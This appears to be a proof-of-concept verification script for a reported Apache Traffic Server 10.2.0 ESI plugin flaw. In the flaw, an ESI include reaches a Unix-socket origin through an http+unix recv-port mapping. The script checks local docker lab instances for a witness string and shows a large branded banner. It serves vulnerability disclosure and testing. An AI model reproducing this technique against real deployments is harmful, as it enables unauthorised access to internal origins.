#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-esi-unix-recvport (High: 8.6)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: ESI include follows http+unix recv-port map
#  Requires: ESI plugin plus map_with_recv_port http+unix
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-esi-unix-recvport"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ATS 10.2.0 ESI FetchSM port 0 matches map_with_recv_port http+unix."""


import os
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path

LABEL = "ats-esi-unix-recvport"
WITNESS = "ATS-ESI-UNIX-RECVPORT-WITNESS"
TCP_BODY = "TCP-ORIGIN-OK"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
CONTROL_URL = os.environ.get("CONTROL_URL", "http://127.0.0.1:18751").rstrip("/")
POC_URL = os.environ.get("POC_URL", "http://127.0.0.1:18750").rstrip("/")
VHOST = "www.example.com"
HERE = Path(__file__).resolve().parent
READY_TIMEOUT_S = 90
HTTP_TIMEOUT_S = 20
VALIDATOR_MARKERS = (
    "Rejecting include URL",
    "bad-scheme",
    "private-host",
    "malformed-url",
    "not-allowlisted",
)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def http_get(base: str, path: str, timeout: int = HTTP_TIMEOUT_S) -> tuple[int, str, str]:
    url = f"{base}{path}"
    req = urllib.request.Request(
        url,
        headers={
            "Host": VHOST,
            "Accept": "text/html",
            "Connection": "close",
        },
        method="GET",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            return int(resp.status), body, dict(resp.headers.items()).__str__()
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return int(exc.code), body, str(exc.headers)
    except urllib.error.URLError as exc:
        return 0, str(exc.reason), ""
    except TimeoutError:
        return 0, "timeout", ""


def wait_ready(base: str, name: str) -> bool:
    deadline = time.time() + READY_TIMEOUT_S
    last = "none"
    while time.time() < deadline:
        status, body, _ = http_get(base, "/health", timeout=3)
        last = f"http={status} body={body.strip()[:80]}"
        if status == 200 and "ok" in body:
            log(f"{name}-ready {last}")
            return True
        log(f"{name}-wait {last}")
        time.sleep(2)
    log(f"{name}-not-ready {last}")
    return False


def dump_logs() -> str:
    proc = compose("logs", "--no-color", "--tail=200")
    blob = (proc.stdout or "") + (proc.stderr or "")
    log("== compose logs ==")
    print(blob[-12000:], flush=True)
    return blob


def validator_quote(logs: str) -> str:
    for line in logs.splitlines():
        lowered = line.lower()
        if any(marker.lower() in lowered for marker in VALIDATOR_MARKERS):
            return line.strip()[:300]
    return ""


def summarize(label: str, status: int, body: str) -> None:
    has_witness = WITNESS in body
    has_tcp = TCP_BODY in body
    log(
        f"{label} http={status} bytes={len(body)} "
        f"witness={int(has_witness)} tcp-origin={int(has_tcp)}"
    )
    preview = body.replace("\n", "\\n")[:240]
    log(f"{label}-body {preview}")


def main() -> int:
    if not wait_ready(CONTROL_URL, "control"):
        dump_logs()
        return fail("control-ats-not-ready")
    if not wait_ready(POC_URL, "poc"):
        dump_logs()
        return fail("poc-ats-not-ready")

    control_status, control_body, _ = http_get(CONTROL_URL, "/page")
    summarize("control-page", control_status, control_body)
    if control_status != 200:
        logs = dump_logs()
        quote = validator_quote(logs)
        extra = f" validator={quote}" if quote else ""
        return fail(f"control-page-http={control_status}{extra}")
    if WITNESS in control_body:
        dump_logs()
        return fail("control-page-has-witness")
    if TCP_BODY not in control_body:
        logs = dump_logs()
        quote = validator_quote(logs)
        extra = f" validator={quote}" if quote else ""
        return fail(f"control-page-missing-tcp-origin{extra}")

    poc_secret_status, poc_secret_body, _ = http_get(POC_URL, "/secret")
    summarize("poc-tcp-secret", poc_secret_status, poc_secret_body)
    if poc_secret_status != 200:
        dump_logs()
        return fail(f"poc-tcp-secret-http={poc_secret_status}")
    if WITNESS in poc_secret_body:
        dump_logs()
        return fail("poc-tcp-secret-has-witness")
    if TCP_BODY not in poc_secret_body:
        dump_logs()
        return fail("poc-tcp-secret-missing-tcp-origin")

    poc_status, poc_body, _ = http_get(POC_URL, "/page")
    summarize("poc-page", poc_status, poc_body)
    if poc_status != 200:
        logs = dump_logs()
        quote = validator_quote(logs)
        extra = f" validator={quote}" if quote else ""
        return fail(f"poc-page-http={poc_status}{extra}")
    if WITNESS not in poc_body:
        logs = dump_logs()
        quote = validator_quote(logs)
        extra = f" validator={quote}" if quote else " (include did not hit UDS origin)"
        return fail(f"poc-page-missing-witness{extra}")
    if TCP_BODY in poc_body:
        dump_logs()
        return fail("poc-page-still-tcp-origin")

    log(
        f"SUCCESS {LABEL} control-no-witness=yes poc-page-witness=yes "
        f"poc-tcp-secret-no-witness=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

